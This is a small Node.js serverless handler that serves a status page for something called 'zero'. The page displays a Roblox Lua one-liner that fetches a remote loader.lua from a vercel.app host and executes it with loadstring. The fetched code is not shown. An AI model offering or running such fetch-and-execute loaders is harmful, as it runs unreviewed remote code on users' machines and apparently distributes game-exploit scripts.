module.exports = (_req, res) => {
  res.statusCode = 200;
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.end(`<!doctype html>
<html><head><meta charset="utf-8"><title>zero</title></head>
<body style="font-family:sans-serif;background:#0b0b0f;color:#fff;display:grid;place-items:center;min-height:100vh">
<div style="max-width:520px;padding:32px;border:1px solid #333;border-radius:16px;background:#12121a">
<h1>zero</h1>
<p>API online.</p>
<code style="display:block;padding:12px;background:#1a1a24;border-radius:8px;white-space:pre-wrap">loadstring(game:HttpGet("https://fuckmark.vercel.app/loader.lua"))()</code>
</div></body></html>`);
};
